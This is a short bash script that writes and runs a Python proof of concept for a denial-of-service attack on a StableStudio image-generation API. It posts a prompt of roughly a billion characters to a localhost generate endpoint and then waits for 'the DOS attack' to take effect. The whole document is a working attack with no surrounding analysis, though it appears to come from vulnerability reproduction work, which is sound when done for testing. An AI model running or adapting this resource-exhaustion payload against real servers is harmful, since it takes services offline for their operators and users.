#!/bin/bash

echo 'import requests

# Number of extra characters to be added to the prompt text
num = 500000000

# Large text by repeating the character "A" num times
large_text = "/#" * num

# URL for the new request
url = "http://localhost:8000/api/stablestudio/generate"

# JSON payload with the large text in the prompt
json_payload = {
    "input": {
        "sampler": {
            "id": "ddim",
            "name": "ddim"
        },
        "height": 512,
        "width": 512,
        "model": "SD-1.5",
        "seed": 0,
        "steps": 50,
        "style": "enhance",
        "prompts": [
            {
                "text": large_text,
                "weight": 1
            }
        ]
    },
    "count": 1
}

# Headers
headers = {
    "Content-Type": "application/json"
}

# Make the POST request and disable SSL verification
response = requests.post(url, headers=headers, json=json_payload, verify=False)

# Print response status and content
print(f"Response status: {response.status_code}")
print(f"Response content: {response.text}")
' > dos.py

python dos.py

# Wait for the DOS attack to take effect
sleep 60